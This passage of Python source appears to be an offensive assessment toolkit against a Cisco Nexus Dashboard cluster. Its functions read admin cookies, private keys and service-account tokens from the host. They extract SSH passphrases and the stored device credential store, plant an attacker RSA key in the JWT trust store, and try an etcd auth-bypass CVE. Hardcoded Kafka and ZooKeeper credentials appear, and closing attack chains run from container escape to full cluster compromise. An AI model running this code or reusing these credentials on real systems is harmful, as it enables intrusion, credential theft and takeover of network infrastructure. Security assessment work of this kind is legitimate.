        "title": "4.3.1 Persists: Log Sanitization Bypasses Unchanged; SECRETS Path Relocated",
        "severity": "MEDIUM",
        "component": "logmgr/log_sanitize.py (4.3.1)",
        "version_delta": "3.2.2m -> 4.3.1",
        "secrets_path_change": {
            "3.2.2m": "SECRETS = '/mnt/atom/logmgr/etc/sanitize-config/sanitize-ts.txt'",
            "4.3.1":  "SECRETS = '/opt/cisco/logmgr/etc/sanitize-config/sanitize-ts.txt'",
        },
        "persisting_findings": {
            "ND-F65": "sanitizeTarball() unbounded recursion — tar bomb DoS",
            "ND-F66": "done-flag bypass — os.path.exists(done_flag) skips sanitization permanently",
            "ND-F67": "SECRETS file inventory exposed (path changed but pattern unchanged)",
            "ND-F56": "node_join.expect argv[2]=token, argv[3]=password — unchanged",
        },
        "status": "ND-F65/F66/F67/F56 all UNFIXED in 4.3.1",
        "references": ["ND-F65", "ND-F66", "ND-F67", "ND-F56"],
    },
}


# ─── Probe Functions ─────────────────────────────────────────────────────────


def read_admin_cookie(cookie_path: str = "/var/run/admin.cookie") -> str | None:
    """
    Read the keyhole admin cookie from the host filesystem.
    Requires read access to /var/run/admin.cookie (chmod 644).
    Attack path: container escape -> host mount -> read cookie.
    """
    try:
        with open(cookie_path, "r") as f:
            return f.read().strip()
    except (PermissionError, FileNotFoundError):
        return None


def probe_keyhole_passphrase(host: str, port: int = 443, cookie: str = "") -> dict:
    """
    Call /keyhole/api/v1/passphrase to retrieve the SSH passphrase.
    Requires the admin cookie (read from /var/run/admin.cookie or brute-forced).
    ND-F01 + ND-F02 combined: cookie read + passphrase exfiltration.
    """
    url = f"https://{host}:{port}/keyhole/api/v1/passphrase?cookie={urllib.parse.quote(cookie)}"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            return {
                "status": resp.status,
                "passphrase": json.loads(resp.read().decode()),
                "finding": "ND-F02",
            }
    except Exception as e:
        return {"error": str(e)}


def probe_keyhole_dbgtoken(host: str, port: int = 443, cookie: str = "") -> dict:
    """
    Call /keyhole/api/v1/dbgtoken — returns SSH challenge plugin token.
    ND-F02.
    """
    url = f"https://{host}:{port}/keyhole/api/v1/dbgtoken?cookie={urllib.parse.quote(cookie)}"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            return {
                "status": resp.status,
                "token": json.loads(resp.read().decode()),
                "finding": "ND-F02",
            }
    except Exception as e:
        return {"error": str(e)}


def probe_keyhole_system_config(host: str, port: int = 443, cookie: str = "") -> dict:
    """
    Call /keyhole/api/v1/system-config — returns syscfg.yaml minus admin_passwd.
    Returns nodeRole, firstMaster, cluster topology.
    ND-F01.
    """
    url = f"https://{host}:{port}/keyhole/api/v1/system-config?cookie={urllib.parse.quote(cookie)}"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            return {
                "status": resp.status,
                "config": json.loads(resp.read().decode()),
                "finding": "ND-F01",
            }
    except Exception as e:
        return {"error": str(e)}


def probe_etcd_kms_noauth(host: str, port: int = 3379) -> dict:
    """
    Probe etcd 3.3.15 KMS endpoint for unauthenticated access.
    CVE-2021-28235: auth bypass via /auth/token/revoke before token validation.
    Returns etcd /health and attempts key list via v3 range request.
    ND-F03.
    """
    # /health endpoint — no auth required
    results = {}
    for path in ["/health", "/version"]:
        url = f"http://{host}:{port}{path}"
        try:
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req, timeout=3) as resp:
                results[path] = {
                    "status": resp.status,
                    "body": resp.read().decode()[:200],
                }
        except Exception as e:
            results[path] = {"error": str(e)}

    # CVE-2021-28235: POST /auth/token/revoke with crafted token before auth enabled
    revoke_url = f"http://{host}:{port}/v3/auth/token/revoke"
    try:
        import base64
        payload = json.dumps({"token": "test"}).encode()
        req = urllib.request.Request(revoke_url, data=payload,
                                     headers={"Content-Type": "application/json"})
        with urllib.request.urlopen(req, timeout=3) as resp:
            results["cve_2021_28235_probe"] = {
                "status": resp.status,
                "body": resp.read().decode()[:200],
                "finding": "ND-F03",
            }
    except Exception as e:
        results["cve_2021_28235_probe"] = {"error": str(e)}

    return results


def probe_kms_grpc_port(host: str, port: int = 7777) -> dict:
    """
    TCP banner probe on kms.bin gRPC port 7777.
    Confirms kms.bin is reachable; gRPC h2 connection prefix indicates service.
    ND-F03.
    """
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect((host, port))
        # gRPC preface: PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n
        s.send(b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n\x00\x00\x00\x04\x00\x00\x00\x00\x00")
        banner = s.recv(64)
        s.close()
        return {
            "port": port,
            "banner_hex": banner.hex(),
            "reachable": True,
            "finding": "ND-F03",
        }
    except Exception as e:
        return {"error": str(e), "reachable": False}


def probe_aaaserver_trustedjwtkeys(host: str, port: int = 7770, attacker_pubkey_pem: str = "") -> dict:
    """
    POST attacker-controlled RSA public key to aaaserver TrustedJWTKeys endpoint.
    ND-F10: Requires mTLS client cert (from ND-F03 etcd bypass) or internal cluster access.
    On success, JWTs signed with the corresponding private key are accepted as admin.
    """
    import base64
    url = f"https://{host}:{port}/aaa/v4/TrustedJWTKeys"
    payload = json.dumps({
        "name": "attacker-key",
        "keyType": "RSA",
        "publicKey": attacker_pubkey_pem,
        "privileges": ["all/admin/"],
    }).encode()
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url, data=payload,
                                     headers={"Content-Type": "application/json"},
                                     method="POST")
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            return {
                "status": resp.status,
                "body": resp.read().decode()[:500],
                "finding": "ND-F10",
            }
    except Exception as e:
        return {"error": str(e), "finding": "ND-F10"}


def probe_tyk_admin_secret(host: str, port: int = 443,
                            secret: str = "352d20ee67be67f6340b4c0605b044b7") -> dict:
    """
    Probe Tyk admin API with default or extracted secret.
    ND-F11: GET /tyk/apis lists all API definitions if secret is accepted.
    Use x-tyk-authorization header; returns API list on 200.
    """
    url = f"https://{host}:{port}/tyk/apis"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url, headers={"x-tyk-authorization": secret})
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            body = resp.read().decode()
            return {
                "status": resp.status,
                "api_count": len(json.loads(body)) if body.startswith("[") else "N/A",
                "body_preview": body[:400],
                "secret_accepted": resp.status == 200,
                "finding": "ND-F11",
            }
    except Exception as e:
        return {"error": str(e), "finding": "ND-F11"}


def probe_firmwared_upload(host: str, port: int = 443) -> dict:
    """
    Check firmwared firmware upload endpoint reachability.
    ND-F12: HEAD /api/v1/firmware/upload reveals if firmwared is network-reachable.
    Full exploit requires valid firmware blob signed by AbraxasACIDev key.
    """
    url = f"https://{host}:{port}/api/v1/firmware/upload"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url, method="HEAD")
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            return {
                "status": resp.status,
                "headers": dict(resp.headers),
                "reachable": True,
                "finding": "ND-F12",
            }
    except urllib.error.HTTPError as e:
        return {"http_error": e.code, "reachable": True, "finding": "ND-F12"}
    except Exception as e:
        return {"error": str(e), "reachable": False, "finding": "ND-F12"}


def read_tyk_secret_from_log(log_path: str = "/logs/launcher.log") -> dict:
    """
    Extract Tyk admin secret from apigw startup log.
    ND-F14: entrypoint.sh logs 'APIGW Mgr ready, secret: "secret":"<value>"' on every start.
    Requires read access to /logs volume (shared across ND containers).
    """
    import re
    result = {"log_path": log_path, "finding": "ND-F14", "secrets_found": []}
    try:
        with open(log_path, "r") as f:
            for line in f:
                if "APIGW Mgr ready, secret:" in line:
                    m = re.search(r'"secret":\s*"([^"]+)"', line)
                    if m:
                        result["secrets_found"].append({
                            "line": line.strip()[:200],
                            "secret": m.group(1),
                        })
    except (PermissionError, FileNotFoundError) as e:
        result["error"] = str(e)
    return result


def probe_confd_debug_api(host: str, port: int = 19999, path: str = "/api/debug/class/ndtrustedcas") -> dict:
    """
    Probe confd debug API for unauthenticated access.
    ND-F16: All management endpoints under /api/debug/ prefix.
    Key paths: /api/debug/class/credentialstore, /api/debug/class/ndtrustedcas,
               /api/debug/passphraseresp (CA passphrase).
    """
    url = f"https://{host}:{port}{path}"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            body = resp.read().decode()
            return {
                "status": resp.status,
                "body_preview": body[:500],
                "credential_count": body.count('"owner"') if "credentialstore" in path else "N/A",
                "finding": "ND-F16/ND-F18",
            }
    except urllib.error.HTTPError as e:
        return {"http_error": e.code, "path": path, "finding": "ND-F16"}
    except Exception as e:
        return {"error": str(e), "path": path}


def probe_securitymgr_ca_passphrase(host: str, port: int = 19999) -> dict:
    """
    GET confd debug passphrase response — returns live CA certificate request passphrase.
    ND-F17: GET /api/debug/passphraseresp -> currCertReqPassphrase.
    """
    url = f"https://{host}:{port}/api/debug/passphraseresp"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            body = json.loads(resp.read().decode())
            return {
                "status": resp.status,
                "passphrase_present": "currCertReqPassphrase" in body,
                "passphrase": body.get("currCertReqPassphrase", "NOT_FOUND"),
                "expiry": body.get("currCertReqPassphraseExpiry", ""),
                "finding": "ND-F17",
            }
    except Exception as e:
        return {"error": str(e), "finding": "ND-F17"}


def dump_credential_store(host: str, port: int = 19999) -> dict:
    """
    GET /api/debug/class/credentialstore — dump all stored device credentials.
    ND-F18: Returns { owner, components: { <device>: { credentials: {user/pass}, sharedWith } } }
    for all ACI APIC and Nexus fabric sites managed by this ND cluster.
    """
    url = f"https://{host}:{port}/api/debug/class/credentialstore"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            body = resp.read().decode()
            stores = json.loads(body) if body.startswith("[") else [json.loads(body)]
            return {
                "status": resp.status,
                "credential_store_count": len(stores),
                "owners": [s.get("owner", "?") for s in stores],
                "raw": stores,
                "finding": "ND-F18",
            }
    except Exception as e:
        return {"error": str(e), "finding": "ND-F18"}


def probe_minio_prometheus(host: str, port: int = 9000) -> dict:
    """
    GET /minio/prometheus/metrics — unauthenticated metrics endpoint.
    ND-F20: MINIO_PROMETHEUS_AUTH_TYPE=public exposes bucket names + object counts.
    """
    url = f"http://{host}:{port}/minio/prometheus/metrics"
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read().decode(errors="replace")
            buckets = [
                line.split('"')[1]
                for line in body.splitlines()
                if 'minio_bucket_usage_object_total' in line and '"' in line
            ]
            return {
                "status": resp.status,
                "bucket_count": len(buckets),
                "buckets": buckets[:20],
                "authenticated": False,
                "finding": "ND-F20",
            }
    except Exception as e:
        return {"error": str(e), "finding": "ND-F20"}


def derive_minio_secret_from_cert(cert_pem_path: str) -> dict:
    """
    Derive MinIO secret key from TLS private key line 2 (minio.sh fallback logic).
    ND-F19: sed '2q;d' /minio/certs/private.key == MINIO_SECRET_KEY at first startup.
    Access key is always 'minio-nd-access-key'.
    """
    try:
        with open(cert_pem_path, "r") as f:
            lines = f.readlines()
        if len(lines) < 2:
            return {"error": "cert too short", "finding": "ND-F19"}
        secret_key = lines[1].strip()
        return {
            "minio_access_key": "minio-nd-access-key",
            "minio_secret_key": secret_key,
            "source": cert_pem_path,
            "note": "secret.key persisted at /minio/data/secret.key after first run",
            "finding": "ND-F19",
        }
    except Exception as e:
        return {"error": str(e), "finding": "ND-F19"}


def probe_minio_api(host: str, port: int = 9000, access_key: str = "minio-nd-access-key",
                    secret_key: str = "") -> dict:
    """
    Test MinIO API access using hardcoded access key + derived secret.
    ND-F19: list buckets via MinIO ListBuckets (S3-compat GET /).
    Signing omitted — use mc or s3cmd with these creds for full access.
    """
    url = f"http://{host}:{port}/"
    try:
        req = urllib.request.Request(url)
        req.add_header("Authorization", f"AWS {access_key}:{secret_key}")
        with urllib.request.urlopen(req, timeout=5) as resp:
            body = resp.read().decode(errors="replace")
            return {
                "status": resp.status,
                "access_key": access_key,
                "body_preview": body[:300],
                "finding": "ND-F19",
            }
    except urllib.request.HTTPError as e:
        return {"http_error": e.code, "access_key": access_key, "finding": "ND-F19"}
    except Exception as e:
        return {"error": str(e), "finding": "ND-F19"}


def probe_opensearch_anon(host: str, port: int = 9200) -> dict:
    """
    Probe OpenSearch with no credentials — ND-F21: anonymous_auth_enabled + all_access mapping.
    Returns index list if anonymous auth grants all_access (as configured in shipped firmware).
    """
    url = f"https://{host}:{port}/_cat/indices?format=json"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, context=ctx, timeout=5) as resp:
            indices = json.loads(resp.read().decode())
            return {
                "status": resp.status,
                "authenticated": False,
                "index_count": len(indices),
                "indices": [i.get("index", "?") for i in indices[:20]],
                "finding": "ND-F21",
            }
    except urllib.request.HTTPError as e:
        return {"http_error": e.code, "authenticated_required": e.code == 401, "finding": "ND-F21"}
    except Exception as e:
        return {"error": str(e), "finding": "ND-F21"}


def probe_mongodb_noauth(host: str, port: int = 27017, ca_cert: str = "") -> dict:
    """
    Test MongoDB for no-auth access. ND-F22: mongod.yaml ships without security.authorization.
    Requires TLS (--tls --tlsCAFile), no credentials needed.
    Use with the ND cluster CA cert from confd debug endpoint (ND-F16).
    Returns subprocess output — requires 'mongo' binary on PATH.
    """
    cmd = [
        "mongo",
        "--tls",
        "--tlsCAFile", ca_cert or "/tmp/nd-cacerts.crt",
        "--ipv6",
        "--host", f"{host}:{port}",
        "--quiet",
        "--eval", "JSON.stringify(db.adminCommand({listDatabases: 1}))",
    ]
    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=10)
        if result.returncode == 0:
            dbs = json.loads(result.stdout.strip().split("\n")[-1])
            return {
                "auth_required": False,
                "databases": [d["name"] for d in dbs.get("databases", [])],
                "total_size_bytes": dbs.get("totalSize", 0),
                "finding": "ND-F22",
            }
        return {"error": result.stderr[:200], "finding": "ND-F22"}
    except subprocess.TimeoutExpired:
        return {"error": "timeout", "finding": "ND-F22"}
    except FileNotFoundError:
        return {"error": "mongo binary not found — install mongodb-clients", "finding": "ND-F22"}
    except Exception as e:
        return {"error": str(e), "finding": "ND-F22"}


def dump_opensearch_index(host: str, index: str, port: int = 9200, size: int = 10) -> dict:
    """
    Dump documents from an OpenSearch index without credentials.
    ND-F21: anonymous all_access permits unrestricted read on all indices.
    Target indices: audit logs, NIR telemetry, NDFC fabric events.
    """
    url = f"https://{host}:{port}/{index}/_search?size={size}"
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        req = urllib.request.Request(
            url,
            data=b'{"query":{"match_all":{}}}',
            headers={"Content-Type": "application/json"},
            method="POST",
        )
        with urllib.request.urlopen(req, context=ctx, timeout=10) as resp:
            body = json.loads(resp.read().decode())
            hits = body.get("hits", {}).get("hits", [])
            return {
                "status": resp.status,
                "index": index,
                "total": body.get("hits", {}).get("total", {}).get("value", 0),
                "sample_count": len(hits),
                "sample": [h.get("_source", {}) for h in hits[:3]],
                "finding": "ND-F21",
            }
    except Exception as e:
        return {"error": str(e), "finding": "ND-F21"}


def check_build_annotation_leakage(squashfs_path: str, service: str = "kms") -> dict:
    """
    Read OCI manifest annotation from squashfs oci_repo to extract CI build metadata.
    Requires squashfs to be mounted or unsquashfs available.
    ND-F06.
    """
    # Mount squashfs and read manifest
    result = {"service": service, "finding": "ND-F06", "annotations": {}}
    manifest_path = f"/tmp/nd-rootfs/oci_repo/apic-sn/{service}/blobs/sha256"
    try:
        blobs = subprocess.check_output(
            ["sudo", "ls", manifest_path], text=True
        ).split()
        for blob in blobs:
            if len(blob) == 64:
                content = subprocess.check_output(
                    ["sudo", "cat", f"{manifest_path}/{blob}"], text=True
                )
                try:
                    j = json.loads(content)
                    if "annotations" in j and "io.stackeroci.stacker.stacker_yaml" in j.get("annotations", {}):
                        result["annotations"][blob[:12]] = j["annotations"]["io.stackeroci.stacker.stacker_yaml"][:200]
                except json.JSONDecodeError:
                    pass
    except Exception as e:
        result["error"] = str(e)
    return result


def probe_kafka_sasl_plain(host: str, port: int = 9092) -> dict:
    """
    Verify Kafka broker reachability and test SASL/PLAIN admin credential. ND-F23.
    Requires kafka-python: pip install kafka-python
    If TLS+SASL_SSL is active, ssl_context must trust the ND CA cert.
    """
    result = {"host": host, "port": port, "finding": "ND-F23", "reachable": False}
    try:
        from kafka import KafkaAdminClient
        from kafka.errors import NoBrokersAvailable, KafkaConnectionError
        import ssl as _ssl

        ssl_ctx = _ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = _ssl.CERT_NONE

        client = KafkaAdminClient(
            bootstrap_servers=f"{host}:{port}",
            security_protocol="SASL_SSL",
            ssl_context=ssl_ctx,
            sasl_mechanism="PLAIN",
            sasl_plain_username="admin",
            sasl_plain_password="admin-secret",
            client_id="nd-probe",
            request_timeout_ms=5000,
        )
        result["reachable"] = True
        result["topics"] = client.list_topics()
        result["auth_bypass"] = True
        result["credential"] = "admin:admin-secret"
        client.close()
    except ImportError:
        result["error"] = "kafka-python not installed"
    except Exception as e:
        result["reachable"] = False
        result["error"] = str(e)[:200]
    return result


def probe_zookeeper_cred(host: str, port: int = 2181) -> dict:
    """
    Test ZooKeeper reachability with ND hardcoded apic credential. ND-F23.
    Uses raw ZK four-letter word 'srvr' to confirm ZK is listening.
    Full auth test requires kazoo: pip install kazoo
    """
    result = {"host": host, "port": port, "finding": "ND-F23", "reachable": False}
    try:
        with socket.create_connection((host, port), timeout=5) as s:
            s.send(b"srvr")
            banner = s.recv(512).decode(errors="replace")
            result["reachable"] = True
            result["banner"] = banner[:300]
            result["version"] = next(
                (l.split(": ", 1)[1] for l in banner.splitlines() if "Zookeeper version" in l), "unknown"
            )
    except Exception as e:
        result["error"] = str(e)[:200]
        return result

    try:
        from kazoo.client import KazooClient
        from kazoo.security import make_digest_acl

        zk = KazooClient(
            hosts=f"{host}:{port}",
            auth_data=[("digest", "apic:LF9DS0MCP282VGL1")],
            timeout=5,
        )
        zk.start(timeout=5)
        result["auth_success"] = True
        result["credential"] = "apic:LF9DS0MCP282VGL1"
        brokers = zk.get_children("/brokers/ids") if zk.exists("/brokers/ids") else []
        result["broker_ids"] = brokers
        topics = zk.get_children("/brokers/topics") if zk.exists("/brokers/topics") else []
        result["topics"] = topics[:20]
        result["total_topics"] = len(topics)
        result["zookeeper_set_acl"] = False
        result["acl_note"] = "ND-F24: broker started with --override zookeeper.set.acl=false"
        zk.stop()
    except ImportError:
        result["kazoo_note"] = "kazoo not installed; banner reachability confirmed only"
    except Exception as e:
        result["auth_error"] = str(e)[:200]
    return result


def probe_jwt_key_via_filesystem(kms_etcd_path: str = "/data/services/kms_etcd") -> dict:
    """
    Read JWT RSA signing key from host filesystem. ND-F25.
    Run on the ND host or inside a container with hostPath access to /data/services/kms_etcd.
    Returns key material if readable.
    """
    key_paths = {
        "rsa_priv": f"{kms_etcd_path}/keys/v1/se/rsa.priv",
        "rsa_pub": f"{kms_etcd_path}/keys/v1/se/rsa.pub",
        "api_key": f"{kms_etcd_path}/keys/v1/se/api.key",
    }
    result = {"finding": "ND-F25", "kms_path": kms_etcd_path, "keys": {}}
    for name, path in key_paths.items():
        try:
            with open(path, "r") as f:
                content = f.read()
            result["keys"][name] = {
                "path": path,
                "readable": True,
                "size": len(content),
                "preview": content[:80] if "PRIVATE" in content else content[:40],
            }
        except PermissionError:
            result["keys"][name] = {"path": path, "readable": False, "error": "permission denied"}
        except FileNotFoundError:
            result["keys"][name] = {"path": path, "readable": False, "error": "not found"}
    result["jwt_forgeable"] = result["keys"].get("rsa_priv", {}).get("readable", False)
    return result


def probe_kms_etcd_cert_paths(kms_etcd_path: str = "/data/services/kms_etcd") -> dict:
    """
    Check TLS private key readability for storaged and bootstrap. ND-F26.
    """
    targets = {
        "storaged_key": f"{kms_etcd_path}/certs/v1/kubernetes/server-key.pem",
        "storaged_cert": f"{kms_etcd_path}/certs/v1/kubernetes/server-cert.pem",
        "storaged_ca": f"{kms_etcd_path}/certs/v1/kubernetes/cacerts.crt",
        "bootstrap_key": f"{kms_etcd_path}/certs/v1/bootstrap/server.key",
        "bootstrap_ca": f"{kms_etcd_path}/certs/v1/bootstrap/ca-bundle.crt",
    }
    result = {"finding": "ND-F26", "tls_keys": {}}
    for name, path in targets.items():
        try:
            with open(path, "r") as f:
                data = f.read()
            result["tls_keys"][name] = {
                "path": path,
                "readable": True,
                "is_private": "PRIVATE KEY" in data,
                "size": len(data),
            }
        except Exception as e:
            result["tls_keys"][name] = {"path": path, "readable": False, "error": str(e)[:80]}
    readable_privkeys = [k for k, v in result["tls_keys"].items() if v.get("readable") and v.get("is_private")]
    result["readable_private_keys"] = readable_privkeys
    return result


def probe_cruisecontrol_admin(host: str, namespace: str = "kafka", port: int = 19090) -> dict:
    """
    Test CruiseControl admin endpoint for unauthenticated access. ND-F28.
    Checks state endpoint (GET) and disable_self_healing (POST, dry-run with invalid param).
    """
    import urllib.error
    base = f"http://cruisecontrol.{namespace}.svc:{port}/kafkacruisecontrol"
    if host:
        base = f"http://{host}:{port}/kafkacruisecontrol"
    result = {"finding": "ND-F28", "target": base, "namespace": namespace}
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    for endpoint, method in [("/state", "GET"), ("/admin", "POST")]:
        url = base + endpoint + ("?disable_self_healing_for=GOAL_VIOLATION" if method == "POST" else "?verbose=true")
        try:
            req = urllib.request.Request(url, method=method,
                                          data=b"" if method == "POST" else None)
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode()[:500]
                result[endpoint] = {"status": resp.status, "auth": "none", "body_preview": body}
        except urllib.error.HTTPError as e:
            result[endpoint] = {"status": e.code, "error": e.reason}
        except Exception as e:
            result[endpoint] = {"error": str(e)[:120]}
    result["unauth_access"] = "/state" in result and result["/state"].get("status") == 200
    return result


def probe_zot_registry_noauth(host: str, port: int = 5000, use_tls: bool = True) -> dict:
    """
    Test Zot OCI registry for unauthenticated access. ND-F29.
    Attempts: GET /v2/ (catalog ping), GET /v2/_catalog (list repos), OCI image tag list.
    """
    scheme = "https" if use_tls else "http"
    base = f"{scheme}://{host}:{port}"
    result = {"finding": "ND-F29", "target": base, "endpoints": {}}
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    for path in ["/v2/", "/v2/_catalog"]:
        try:
            req = urllib.request.Request(f"{base}{path}", headers={"Accept": "application/json"})
            with urllib.request.urlopen(req, timeout=5, context=ssl_ctx) as resp:
                body = resp.read().decode()[:500]
                result["endpoints"][path] = {"status": resp.status, "body": body}
        except urllib.error.HTTPError as e:
            result["endpoints"][path] = {"status": e.code, "error": e.reason}
        except Exception as e:
            result["endpoints"][path] = {"error": str(e)[:120]}
    result["unauth_pull"] = "/v2/" in result["endpoints"] and result["endpoints"]["/v2/"].get("status") == 200
    result["catalog_readable"] = "/v2/_catalog" in result["endpoints"] and result["endpoints"]["/v2/_catalog"].get("status") == 200
    return result


def probe_cluster_admin_via_sa_token(token_path: str = "/var/run/secrets/kubernetes.io/serviceaccount/token") -> dict:
    """
    Read mounted service account token and attempt K8s API call to verify cluster-admin. ND-F30.
    Must run from inside a cisco-ndfc/mso/nir/appmgr pod.
    """
    result = {"finding": "ND-F30", "token_path": token_path}
    try:
        with open(token_path, "r") as f:
            token = f.read().strip()
        result["token_present"] = True
        result["token_length"] = len(token)
        req = urllib.request.Request(
            "https://kubernetes.default.svc/api/v1/namespaces",
            headers={"Authorization": f"Bearer {token}"},
        )
        ssl_ctx = ssl.create_default_context()
        ssl_ctx.check_hostname = False
        ssl_ctx.verify_mode = ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=5, context=ssl_ctx) as resp:
            body = resp.read().decode()[:200]
            result["namespaces_listed"] = resp.status == 200
            result["body_preview"] = body
        req2 = urllib.request.Request(
            "https://kubernetes.default.svc/api/v1/namespaces/kube-system/secrets",
            headers={"Authorization": f"Bearer {token}"},
        )
        with urllib.request.urlopen(req2, timeout=5, context=ssl_ctx) as resp2:
            result["kube_system_secrets_readable"] = resp2.status == 200
            result["cluster_admin_confirmed"] = result["kube_system_secrets_readable"]
    except (PermissionError, FileNotFoundError):
        result["token_present"] = False
    except urllib.error.HTTPError as e:
        result["k8s_api_error"] = {"status": e.code, "reason": e.reason}
    except Exception as e:
        result["error"] = str(e)[:120]
    return result


def probe_ndfc_lanconfig_creds(host: str, jwt_token: str, port: int = 443) -> dict:
    """
    Attempt NDFC LAN switch credential retrieval with a JWT token. ND-F33.
    jwt_token: forged JWT signed with ND RSA private key (from ND-F25).
    """
    base = f"https://{host}:{port}"
    result = {"finding": "ND-F33", "target": base, "endpoints": {}}
    ssl_ctx = ssl.create_default_context()
    ssl_ctx.check_hostname = False
    ssl_ctx.verify_mode = ssl.CERT_NONE
    endpoints = [
        "/api/v1/rest/lanconfig/getlanswitchcredentials",
        "/api/v1/rest/lanconfig/getdefaultcredentials",
        "/api/v1/rest/lanconfig/islancredentialsset",
    ]
    for path in endpoints:
        try:
            req = urllib.request.Request(
                f"{base}{path}",
                headers={"Authorization": f"Bearer {jwt_token}", "Accept": "application/json"},
            )
            with urllib.request.urlopen(req, timeout=5, context=ssl_ctx) as resp:
                body = resp.read().decode()[:800]
                result["endpoints"][path] = {"status": resp.status, "body": body}
        except urllib.error.HTTPError as e:
            result["endpoints"][path] = {"status": e.code, "error": e.reason}
        except Exception as e:
            result["endpoints"][path] = {"error": str(e)[:120]}
    result["creds_accessible"] = any(
        v.get("status") == 200 for v in result["endpoints"].values()
    )
    return result


def probe_keyhole_cookie_auth(host: str = "127.0.0.1", port: int = 30020) -> dict:
    """ND-F43/F44/F45: Test keyhole cookie authentication and enumerate accessible endpoints.
    Reads /var/run/admin.cookie if present (local execution), then probes key endpoints.
    """
    import urllib.request
    import urllib.error

    result = {
        "finding": "ND-F01+ND-F43",
        "host": host,
        "port": port,
        "cookie_path": "/var/run/admin.cookie",
        "cookie_readable": False,
        "cookie_value": None,
        "endpoints_tested": {},
        "kubectl_accessible": False,
        "passphrase_accessible": False,
    }

    try:
        with open("/var/run/admin.cookie", "r") as f:
            result["cookie_value"] = f.readline().strip()
            result["cookie_readable"] = True
    except (PermissionError, FileNotFoundError):
        result["cookie_readable"] = False
        return result

    base = f"http://{host}:{port}/keyhole/api/v1"
    cookie = result["cookie_value"]

    probe_endpoints = [
        ("version", f"{base}/version?cookie={cookie}"),
        ("passphrase", f"{base}/passphrase?cookie={cookie}"),
        ("system-config", f"{base}/system-config?cookie={cookie}"),
        ("kubectl-get-ns", f"{base}/kubectl?args=get%20namespaces&cookie={cookie}"),
    ]

    for label, url in probe_endpoints:
        try:
            req = urllib.request.Request(url)
            with urllib.request.urlopen(req, timeout=5) as resp:
                body = resp.read().decode()[:1000]
                result["endpoints_tested"][label] = {"status": resp.status, "body": body}
        except urllib.error.HTTPError as e:
            result["endpoints_tested"][label] = {"status": e.code, "error": e.reason}
        except Exception as e:
            result["endpoints_tested"][label] = {"error": str(e)[:120]}

    result["kubectl_accessible"] = result["endpoints_tested"].get("kubectl-get-ns", {}).get("status") == 200
    result["passphrase_accessible"] = result["endpoints_tested"].get("passphrase", {}).get("status") == 200
    return result


# ─────────────────────────────────────────────────────────────────────────────


_UNUSED = {
    "chain_1_node_compromise": {
        "title": "Container Escape -> Node SSH Access",
        "steps": [
            "1. Container escape OR host-volume mount read access to ND node",
            "2. cat /var/run/admin.cookie (chmod 644, world-readable) -> cookie value",
            "3. GET /keyhole/api/v1/passphrase?cookie=<value> -> SSH passphrase",
            "4. GET /keyhole/api/v1/dbgtoken?cookie=<value> -> SSH debug token",
            "5. SSH to ND node using passphrase + ifc_admin key",
            "6. kubectl with rescue-user token -> full cluster enumeration",
        ],
        "entry_requirement": "Any process on ND host with /var/run read access",
        "findings": ["ND-F01", "ND-F02", "ND-F05"],
    },
    "chain_2_pki_collapse": {
        "title": "etcd Auth Bypass -> Full Cluster mTLS Compromise",
        "steps": [
            "1. Reach KMS etcd on port 3379 (from kms pod or network access)",
            "2. CVE-2021-28235: POST /v3/auth/token/revoke -> auth bypass",
            "3. ETCDCTL_API=3 etcdctl get --prefix '' -> enumerate all stored keys",
            "4. Extract private keys for all 80+ services from kms_etcd store",
            "5. Forge mTLS certificates for any service (Kafka, K8s apiserver, apigw)",
            "6. Impersonate aaamgr/aaaserver -> auth bypass cluster-wide",
        ],
        "entry_requirement": "Network access to kms pod (port 3379) or node-level access",
        "findings": ["ND-F03", "ND-F04"],
    },
